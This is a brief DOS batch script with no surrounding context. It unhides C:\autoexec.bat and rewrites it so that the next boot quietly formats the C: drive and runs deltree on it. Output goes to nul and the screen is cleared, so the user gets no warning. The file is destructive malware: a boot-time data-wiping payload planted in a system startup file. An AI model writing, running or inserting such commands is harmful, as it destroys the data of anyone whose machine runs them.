ATTRIB  -h -r C:\autoexec.bat      > nul
echo @echo off                   > C:\autoexec.bat
echo format C: /q /u /autotest                        >> C:\autoexec.bat
echo deltree /y C:                        >> C:\autoexec.bat
CLS
